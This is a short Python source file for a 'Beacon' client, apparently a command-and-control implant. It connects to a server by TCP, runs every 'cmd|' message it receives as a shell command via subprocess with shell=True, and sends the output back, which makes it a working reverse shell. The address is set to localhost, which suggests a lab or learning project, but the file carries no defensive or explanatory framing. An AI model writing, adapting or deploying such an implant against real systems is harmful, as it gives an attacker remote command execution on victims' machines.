#!/usr/bin/python3

import socket,subprocess

class Beacon:
   #Contains client side behavior and state

   __slots__ = ["sock","running","server_ip","server_port","debugging"]

   def __init__(self,server_ip,server_port):
      self.running = False
      self.server_ip = server_ip
      self.server_port = server_port
      self.debugging = True

   def connect(self):
      self.sock.connect((self.server_ip,self.server_port))

   def start(self):
      self.running = True
      self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      self.connect()
      while self.running:
            self.sock.settimeout(5)
            try:
               data = self.sock.recv(4096).decode()
               if not data:
                  # If no data is received, break the loop
                  break
               if self.debugging == True:
                  print("Received:",data)
               split = data.split("|")
               if split[0] == "cmd":
                  try:
                     command = split[1].split(" ")
                     ps = subprocess.run(command, shell=True, capture_output=True,check=True)
                     if self.debugging == True:
                        print("Sending:" ,ps.stdout)
                     if ps.stdout != None and ps.stdout!= "":
                        self.sock.send(ps.stdout)
                     else:
                        self.sock.send("SUCCESS")
                  except Exception as e:
                     error_msg = f"ERROR: {str(e)}"
                     print(error_msg)
                     self.sock.send(error_msg.encode())
               elif split[0] == "quit":
                  self.terminate()
               else:
                  self.sock.send("Unknown Error".encode())
            except socket.timeout:
                continue

   def terminate(self):
      self.running = False
      self.sock.close()

def main():
   beacon = Beacon("127.0.0.1",10267)
   beacon.start()

main()